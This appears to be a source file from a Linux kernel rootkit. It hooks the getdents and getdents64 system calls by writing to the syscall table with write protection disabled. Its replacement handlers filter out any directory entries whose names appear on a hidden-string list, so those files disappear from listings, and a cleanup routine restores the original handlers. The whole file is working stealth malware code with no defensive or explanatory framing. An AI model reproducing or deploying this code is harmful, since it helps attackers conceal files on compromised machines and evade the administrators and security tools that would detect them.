#include <linux/uaccess.h>
#include <linux/string.h>
#include <linux/gfp.h>
#include <linux/slab.h>
#include <linux/dirent.h>
#include "rootkit.h"
#include "file_hide.h"
#include "rootkit_utils.h"
#include "rootkit_strings.h"

// function type for the getdents handler function
asmlinkage long (*original_sys_getdents)(unsigned int fd, struct linux_dirent __user *dirent, unsigned int count);
asmlinkage long (*original_sys_getdents64)(unsigned int fd, struct linux_dirent64 __user *dirent, unsigned int count);




// Hooked getdents system call
asmlinkage long sys_getdents_hook(unsigned int fd, struct linux_dirent __user *dirent, unsigned int count) {
    struct linux_dirent *p;
    mm_segment_t old_fs;
    char *buf, *userp;
    long ret, i, j;

    userp = (char *) dirent;

    buf = kmalloc(count, GFP_KERNEL);
    if (!buf)
        return -ENOBUFS;

    old_fs = get_fs();
    set_fs(KERNEL_DS);
    ret = original_sys_getdents(fd, (struct linux_dirent *)buf, count);
    set_fs(old_fs);

    for (i = j = 0; i < ret; i += p->d_reclen) {
        p = (struct linux_dirent *) (buf + i);

        if (in_fs_strings((char*)p->d_name)) {
            continue;
        }
        
        if (copy_to_user(userp + j, p, p->d_reclen)) {
            ret = -EAGAIN;
            goto end;
        }

        j += p->d_reclen;
    }

    if (ret > 0)
        ret = j;

end:
    kfree(buf);
    return ret;
}

// Hooked getdents64 system call
asmlinkage long sys_getdents64_hook(unsigned int fd, struct linux_dirent64 __user *dirent, unsigned int count) {
    struct linux_dirent64 *p;
    mm_segment_t old_fs;
    char *buf, *userp;
    long ret, i, j;

    userp = (char *) dirent;

    buf = kmalloc(count, GFP_KERNEL);
    if (!buf)
        return -ENOBUFS;

    old_fs = get_fs();
    set_fs(KERNEL_DS);
    ret = original_sys_getdents64(fd, (struct linux_dirent64 *)buf, count);
    set_fs(old_fs);

    for (i = j = 0; i < ret; i += p->d_reclen) {
        p = (struct linux_dirent64 *) (buf + i);

        if (in_fs_strings((char*)p->d_name)) {
            continue;
        }

        if (copy_to_user(userp + j, p, p->d_reclen)) {
            ret = -EAGAIN;
            goto end;
        }

        j += p->d_reclen;
    }
    if (ret > 0)
        ret = j;

end:
    kfree(buf);

    return ret;
}  


int init_file_hide(void)
{   
    void **sys_call_table_ptr; // Save the address of the system call table

    // Get the address of the syscall table
    sys_call_table_ptr = get_syscall_table_address();
    printk(KERN_INFO "sys_call_table_ptr: %p\n", sys_call_table_ptr);

    // Disable write protection
    disable_write_protect();   
 
    original_sys_getdents = sys_call_table_ptr[__NR_getdents];
    sys_call_table_ptr[__NR_getdents] = sys_getdents_hook;

    original_sys_getdents64 = sys_call_table_ptr[__NR_getdents64];
    sys_call_table_ptr[__NR_getdents64] = sys_getdents64_hook;

    // Enable write protection
    enable_write_protect();
    
    return 0;
}

void cleanup_file_hide(void)
{   
    void **sys_call_table_ptr; // Save the address of the system call table

    // Get the address of the syscall table
    sys_call_table_ptr = get_syscall_table_address();

    // Disable write protection
    disable_write_protect();

    // Hook getdents system call to hide files
    printk(KERN_INFO "Removing getdents and getdents64 hook\n"); 
    sys_call_table_ptr[__NR_getdents] = original_sys_getdents;
    sys_call_table_ptr[__NR_getdents64] = original_sys_getdents64;

    // Enable write protection
    enable_write_protect();
}
